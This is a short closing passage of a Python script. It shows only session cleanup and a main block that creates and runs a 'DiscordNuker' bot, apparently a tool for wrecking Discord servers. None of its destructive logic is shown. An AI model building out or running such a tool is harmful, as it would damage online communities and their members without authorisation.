            asyncio.run(self._close_all_sessions())

if __name__ == '__main__':
    nuker = DiscordNuker()
    nuker.get_inputs()
    nuker.run_bot()
